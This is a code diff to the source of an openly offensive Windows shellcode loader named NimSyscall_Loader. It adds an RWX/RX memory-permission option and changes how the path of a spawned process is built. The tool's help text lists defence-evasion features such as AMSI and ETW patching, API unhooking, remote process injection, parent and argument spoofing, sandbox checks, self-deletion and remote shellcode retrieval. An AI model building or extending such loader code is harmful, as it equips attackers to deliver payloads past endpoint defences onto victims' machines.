@@ -64,7 +64,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.8
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -95,6 +95,7 @@ Options:
     --psobfs    Pre-obfuscated Powershell Template with Invoke-obfuscation
     --pslyrics    Add Lyrics as comments to avoid some more detections
   --sourceonly    Dont compile but just create the source code and compile command
+  --RWX    Use RWX memory permissions for Shellcode and PE-Loading (instead of default RX)
 
 [Payload retrieval options]
 
@@ -235,6 +236,7 @@ var
     ETW: bool = true
     COMVARETW: bool = false
     shellcode: bool = true
+    RWX: bool = false
     callbackexecute: bool = false
     wait: bool = true
     localCreateThread: bool = false
@@ -314,6 +316,9 @@ if args["--shellcode"]:
   shellcode = true
   csharp = false
   peload = false
+
+if args["--RWX"]:
+  RWX = true
 
 if args["--CallbackExecute"]:
   callbackexecute = true
@@ -1654,9 +1659,9 @@ let NotepadProcIDStub * = fmt"""
 
 
         when defined spoof_args:
-            tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")) & " " & obf("{spoofArgs}"))
+            tProcPath = newWideCString(obf("{customspawnprocess}") & " " & obf("{spoofArgs}"))
         else:
-            tProcPath = newWideCString(joinPath(r"C:\Windows\System32", obf("{customspawnprocess}")))
+            tProcPath = newWideCString(obf("{customspawnprocess}"))
 
         when defined(blockDLLs) or (obf("{parentProcess}") != ""):
             InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
@@ -2146,6 +2151,9 @@ elif system.hostOS == "linux":
 
 if((existingprocessInjection == false) and (remoteinject)):
     basicCompileFlags.add("-d:spawninject ")
+
+if(RWX == false):
+    basicCompileFlags.add("-d:RX ")
 
 if (dllProxy):
     basicCompileFlags.add("--mm:orc --threads:on ")
